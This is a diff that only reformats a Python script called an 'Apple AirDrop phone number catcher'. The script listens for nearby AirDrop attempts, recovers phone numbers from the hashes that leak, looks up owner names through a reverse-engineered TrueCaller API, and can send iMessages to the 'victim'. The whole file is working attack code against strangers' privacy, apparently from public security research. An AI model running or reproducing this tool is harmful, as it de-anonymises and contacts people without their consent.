@@ -23,25 +23,38 @@ from opendrop2.cli import AirDropCli
 from opendrop2.server import get_devices
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
 
-help_desc = '''
+help_desc = """
 Apple AirDrop phone number catcher
 ---chipik
-'''
+"""
 requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
-parser = argparse.ArgumentParser(description=help_desc, formatter_class=argparse.RawTextHelpFormatter)
-parser.add_argument('-c', '--check_hash', action='store_true', help='Get phone number by hash')
-parser.add_argument('-n', '--check_phone', action='store_true', help='Get user info by phone number (TrueCaller/etc)')
-parser.add_argument('-m', '--message', action='store_true', help='Send iMessage to the victim')
+parser = argparse.ArgumentParser(
+    description=help_desc, formatter_class=argparse.RawTextHelpFormatter
+)
+parser.add_argument(
+    "-c", "--check_hash", action="store_true", help="Get phone number by hash"
+)
+parser.add_argument(
+    "-n",
+    "--check_phone",
+    action="store_true",
+    help="Get user info by phone number (TrueCaller/etc)",
+)
+parser.add_argument(
+    "-m", "--message", action="store_true", help="Send iMessage to the victim"
+)
 args = parser.parse_args()
 
-base_url = ''  # URL to hash2phone matcher
-imessage_url = ''  # URL to iMessage sender (sorry, but we did some RE for that :) )
+base_url = ""  # URL to hash2phone matcher
+imessage_url = ""  # URL to iMessage sender (sorry, but we did some RE for that :) )
 verify = False
 results = {}
 
 if args.message:
     if not imessage_url:
-        print("You have to specify imessage_url if you want to send iMessages to the victim")
+        print(
+            "You have to specify imessage_url if you want to send iMessages to the victim"
+        )
         exit(1)
 if args.check_phone:
     # import from TrueCaller API lib (sorry, but we did some RE for that :))
@@ -55,10 +68,10 @@ if args.check_hash:
 
 def get_phone(hash):
     global phone_number_info
-    r = requests.get(base_url, params={'hash': hash}, verify=verify)
+    r = requests.get(base_url, params={"hash": hash}, verify=verify)
     if r.status_code == 200:
         result = r.json()
-        return result['candidates']
+        return result["candidates"]
     else:
         print("Something wrong! Status: {}".format(r.status_code))
 
@@ -69,20 +82,17 @@ def start_listetninig():
 
 
 def get_hash(data):
-    return hashlib.sha256(data.encode('utf-8')).hexdigest()
+    return hashlib.sha256(data.encode("utf-8")).hexdigest()
 
 
 def get_names(phone, lat=False):
-    name, carrier, region = get_number_info_TrueCaller('+{}'.format(phone), lat)
+    name, carrier, region = get_number_info_TrueCaller("+{}".format(phone), lat)
     return name, carrier, region
 
 
 def send_imessage(tel, text):
-    data = {"token": "",
-            "destination": "+{}".format(tel),
-            "text": text
-            }
-    r = requests.post(imessage_url + '/imessage', data=json.dumps(data), verify=verify)
+    data = {"token": "", "destination": "+{}".format(tel), "text": text}
+    r = requests.post(imessage_url + "/imessage", data=json.dumps(data), verify=verify)
     if r.status_code == 200:
         print("[*] iMessage sent")
     elif r.status_code == 404:
@@ -111,24 +121,40 @@ while 1:
                                 dev["phone"] = candidate
                                 results[dev["phone"]] = dev
                                 if args.check_phone:
-                                    name, carrier, region = get_names(dev["phone"], True)
+                                    name, carrier, region = get_names(
+                                        dev["phone"], True
+                                    )
                                     print(
                                         "Someone with phone number \033[92m{} ({})\033[0m and ip \033[92m{}\033[0m has tried to use AirDrop".format(
-                                            dev["phone"], name, dev["ip"]))
+                                            dev["phone"], name, dev["ip"]
+                                        )
+                                    )
                                     if args.message:
-                                        send_imessage(dev["phone"],
-                                                      "Hi, {}! Have you tried to send smth via AirDrop?".format(name))
+                                        send_imessage(
+                                            dev["phone"],
+                                            "Hi, {}! Have you tried to send smth via AirDrop?".format(
+                                                name
+                                            ),
+                                        )
                                 else:
                                     print(
                                         "Someone with phone number \033[92m{}\033[0m and ip \033[92m{}\033[0m has tried to use AirDrop".format(
-                                            dev["phone"], dev["ip"]))
+                                            dev["phone"], dev["ip"]
+                                        )
+                                    )
                                     if args.message:
-                                        send_imessage(dev["phone"],
-                                                      "Hi {}! Have you tried to send smth via AirDrop?".format(
-                                                          dev["phone"]))
+                                        send_imessage(
+                                            dev["phone"],
+                                            "Hi {}! Have you tried to send smth via AirDrop?".format(
+                                                dev["phone"]
+                                            ),
+                                        )
                     else:
-                        print("Someone with phone number hash \033[92m{}\033[0m has tried to use AirDrop".format(
-                            dev["hash"]))
+                        print(
+                            "Someone with phone number hash \033[92m{}\033[0m has tried to use AirDrop".format(
+                                dev["hash"]
+                            )
+                        )
 
                 else:
                     print("We've got an empty hash :/")
